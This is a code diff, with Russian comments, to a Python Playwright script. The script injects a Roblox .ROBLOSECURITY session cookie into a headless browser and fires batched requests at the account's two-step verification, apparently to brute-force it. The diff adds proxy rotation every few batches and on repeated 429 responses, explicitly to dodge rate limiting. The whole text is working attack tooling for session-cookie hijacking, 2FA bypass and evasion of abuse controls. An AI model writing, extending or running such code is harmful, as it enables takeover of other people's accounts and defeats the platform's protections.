@@ -378,63 +378,75 @@ async (count) => {
 }
 """
 
-BATCH_SIZE     = 25
-PAUSE_NORMAL   = 0.3
-PAUSE_2FA_WAIT = 5.0
-PAUSE_429      = 5.0
-DEADLINE       = 600   # 10 минут
-MAX_ERRORS     = 5     # сколько подряд ошибок до перезагрузки страницы
+BATCH_SIZE        = 25
+PAUSE_NORMAL      = 0.3
+PAUSE_2FA_WAIT    = 5.0
+PAUSE_429         = 2.0   # при 429 быстро меняем прокси — не ждём долго
+DEADLINE          = 600
+MAX_ERRORS        = 5
+ROTATE_PROXY_EVERY = 3    # менять прокси каждые N батчей
 
 
-def _reload_page(page, cookie_value):
-    """Перезагружает страницу и сбрасывает CSRF."""
-    try:
-        logging.info("Перезагружаю страницу...")
-        page.goto("https://www.roblox.com/my/account#!/info",
-                  wait_until="domcontentloaded", timeout=20000)
-        page.wait_for_timeout(2000)
-        # Сбрасываем кешированный CSRF чтобы JS получил новый
-        try:
-            page.evaluate("() => { window.__csrf = null; }")
-        except Exception:
-            pass
-        logging.info("Страница перезагружена")
-        return True
-    except Exception as e:
-        logging.error("Ошибка перезагрузки: %s", e)
-        return False
+def _make_page(browser, cookie: str):
+    """Создаёт новый контекст с новым прокси и возвращает страницу."""
+    proxy = get_proxy_url()
+    logging.info("Новый прокси: %s", proxy["server"])
+    ctx = browser.new_context(
+        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+        viewport={"width": 1280, "height": 800},
+        proxy=proxy,
+    )
+    ctx.add_cookies([{
+        "name": ".ROBLOSECURITY",
+        "value": cookie,
+        "domain": ".roblox.com",
+        "path": "/",
+    }])
+    page = ctx.new_page()
+    page.goto("https://www.roblox.com/my/account#!/info",
+              wait_until="domcontentloaded", timeout=30000)
+    page.wait_for_timeout(2000)
+    return page, ctx
 
 
 def run_2fa_worker(cookie: str, method: str) -> str | None:
     try:
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=True)
-            ctx = browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
-                viewport={"width": 1280, "height": 800},
-                proxy=get_proxy_url(),
-            )
-            ctx.add_cookies([{
-                "name": ".ROBLOSECURITY",
-                "value": cookie,
-                "domain": ".roblox.com",
-                "path": "/",
-            }])
-            page = ctx.new_page()
-            page.goto("https://www.roblox.com/my/account#!/info",
-                      wait_until="domcontentloaded", timeout=30000)
-            page.wait_for_timeout(2000)
+            page, ctx = _make_page(browser, cookie)
 
             start = time.time()
             iteration = 0
             total_requests = 0
-            consecutive_errors = 0  # счётчик подряд идущих ошибок
+            consecutive_errors = 0
+            consecutive_429 = 0
 
             while time.time() - start < DEADLINE:
                 if page.is_closed():
-                    logging.warning("Страница закрылась, выходим")
-                    break
+                    logging.warning("Страница закрылась — пересоздаю")
+                    try:
+                        ctx.close()
+                    except Exception:
+                        pass
+                    page, ctx = _make_page(browser, cookie)
+                    consecutive_errors = 0
+                    continue
+
                 iteration += 1
+
+                # Ротация прокси каждые N батчей
+                if iteration % ROTATE_PROXY_EVERY == 0:
+                    logging.info("Ротация прокси (batch #%d)", iteration)
+                    try:
+                        ctx.close()
+                    except Exception:
+                        pass
+                    try:
+                        page, ctx = _make_page(browser, cookie)
+                        consecutive_429 = 0
+                    except Exception as e:
+                        logging.error("Ошибка ротации прокси: %s", e)
+                    continue
 
                 try:
                     results = page.evaluate(JS_FETCH_BATCH, BATCH_SIZE)
@@ -442,8 +454,15 @@ def run_2fa_worker(cookie: str, method: str) -> str | None:
                     consecutive_errors += 1
                     logging.warning("Ошибка evaluate #%d: %s", consecutive_errors, e)
                     if consecutive_errors >= MAX_ERRORS:
-                        logging.warning("Много ошибок подряд — перезагружаю страницу")
-                        _reload_page(page, cookie)
+                        logging.warning("Много ошибок — меняю прокси")
+                        try:
+                            ctx.close()
+                        except Exception:
+                            pass
+                        try:
+                            page, ctx = _make_page(browser, cookie)
+                        except Exception:
+                            pass
                         consecutive_errors = 0
                     page.wait_for_timeout(1000)
                     continue
@@ -451,13 +470,20 @@ def run_2fa_worker(cookie: str, method: str) -> str | None:
                 if not results:
                     consecutive_errors += 1
                     if consecutive_errors >= MAX_ERRORS:
-                        logging.warning("Пустые результаты — перезагружаю страницу")
-                        _reload_page(page, cookie)
+                        logging.warning("Пустые результаты — меняю прокси")
+                        try:
+                            ctx.close()
+                        except Exception:
+                            pass
+                        try:
+                            page, ctx = _make_page(browser, cookie)
+                        except Exception:
+                            pass
                         consecutive_errors = 0
                     page.wait_for_timeout(500)
                     continue
 
-                consecutive_errors = 0  # сбрасываем счётчик ошибок
+                consecutive_errors = 0
                 total_requests += len(results)
                 elapsed = time.time() - start
                 rps = total_requests / elapsed if elapsed > 0 else 0
@@ -503,7 +529,8 @@ def run_2fa_worker(cookie: str, method: str) -> str | None:
 
                     elif status == 429:
                         got_429 = True
-                        logging.warning("429 rate limit!")
+                        consecutive_429 += 1
+                        logging.warning("429 rate limit! (подряд: %d)", consecutive_429)
 
                     elif status == 403:
                         if "twostepverification" in ctype.lower():
@@ -526,10 +553,28 @@ def run_2fa_worker(cookie: str, method: str) -> str | None:
                 if got_2fa:
                     page.wait_for_timeout(int(PAUSE_2FA_WAIT * 1000))
                 elif got_429:
-                    page.wait_for_timeout(int(PAUSE_429 * 1000))
+                    if consecutive_429 >= 2:
+                        # Прокси заблокирован — меняем немедленно
+                        logging.warning("429 подряд %d раз — меняю прокси!", consecutive_429)
+                        try:
+                            ctx.close()
+                        except Exception:
+                            pass
+                        try:
+                            page, ctx = _make_page(browser, cookie)
+                            consecutive_429 = 0
+                        except Exception as e:
+                            logging.error("Ошибка смены прокси: %s", e)
+                    else:
+                        page.wait_for_timeout(int(PAUSE_429 * 1000))
                 else:
+                    consecutive_429 = 0
                     page.wait_for_timeout(int(PAUSE_NORMAL * 1000))
 
+            try:
+                ctx.close()
+            except Exception:
+                pass
             browser.close()
 
     except Exception as e:
